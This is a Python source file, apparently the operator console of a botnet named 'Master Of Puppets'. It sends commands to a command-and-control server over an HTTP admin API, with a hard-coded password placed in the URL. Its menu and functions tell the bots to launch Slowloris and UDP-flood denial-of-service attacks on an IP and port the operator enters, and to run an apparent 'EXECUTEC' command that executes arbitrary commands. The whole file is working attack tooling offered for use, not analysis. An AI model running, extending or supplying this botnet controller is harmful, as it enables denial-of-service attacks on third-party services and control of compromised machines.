#---------------------------------------------#     Filename: commander.py
#             Master Of Puppets               #
#                                             #     This is the admin-client part of Master of Puppets.
#               by Commod0re                  #
#                                             #
#                 v. 0.0.1                    #
#                                             #
#---------------------------------------------#

from colorama import Fore
import requests, pyfiglet

#----------------CONFIG ZONE------------------#

ADMINSERVER = "127.0.0.1:5000"  # adress of C&C

ADMINPASSWORD = "password"  # password to authentificate in C&C

COMMANDLIST = [
    "slowloris", "udpddos", "STOPALL", "WAIT", "SETTIMEWAIT", "PRINT", "EXECUTEC"
]  # commands that allowed to send in C&C, add custom command here

CMDTT = (Fore.RED + "master") + (Fore.YELLOW + "@") + (
    Fore.GREEN + "botnet# ")  # this is how looks like shell design

#---------------------------------------------#


def menu():  # menu and graphics funtion
    banner1 = (Fore.RED + pyfiglet.figlet_format("MASTER"))
    banner2 = (Fore.RED + pyfiglet.figlet_format("       of puppets"))
    print(banner1, banner2)
    print("  by Commod0re v. 0.0.1 GPLv.3 \n\n")

    menu1 = """
    =================COMMANDS=================
    slowloris -- Slowloris DDoS Attack
    udpddos -- UDP flood DDoS
    STOPALL -- Stop all puppets tasks
    WAIT -- Wait for commands, nothing to do
    SETTIMEWAIT <seconds> -- bot wait
    PRINT <message> -- bot print message 
    ==========================================
    """

    menu = (Fore.YELLOW + menu1)
    print(menu)


def sendcommand(command):  # Function to make admin-api request to C&C
    try:
        requests.get(
            f"http://{ADMINSERVER}/adminapi?password={ADMINPASSWORD}&command={command}"
        )
    except Exception:
        print("Server error")


#---------------BOTNET-COMMANDS---------------# Special local functions for commands


def slowloris():  # slowloris DDoS attack
    name = "slowloris "
    ip = input("[?] IP Addres: ")
    port = input("[?] Port: ")
    sockets = input("[?] Sockets: ")

    to_write_string = name + ip + " -p " + port + " -s " + sockets

    print(to_write_string)

    sendcommand(to_write_string)  # call admin-request function

    # Add here new func-commands


def udpddos():
    name = "udpddos "
    ip = input("[?] IP Addres: ")
    port = input("[?] Port: ")
    wait = input("[?] Custom Wait[<seconds>/n]: ")
    if wait == "n":
        wait = "no"
    else:
        pass

    to_write_string = name + ip + " " + port + " " + wait

    print(to_write_string)  

    sendcommand(to_write_string)


#---------------------------------------------#


def command_resolver(command):  # Function that routes command, special commands have func, another sends in raw data

    # if you wanna add command with special func just write it below like others

    if command.split(" ")[0] == "slowloris":  # slowloris func-command
        slowloris()

    if command.split(" ")[0] == "udpddos":  # udpddos func-command
        udpddos()

    else:
        sendcommand(command)  # send raw data


def mainloop():  # main commandline loop
    while True:
        cmd = input(CMDTT)
        if cmd.split(" ")[0] in COMMANDLIST:
            command_resolver(cmd)

        else:
            print("[-] Command unknown")


if __name__ == "__main__":  # start point
    menu()
    mainloop()
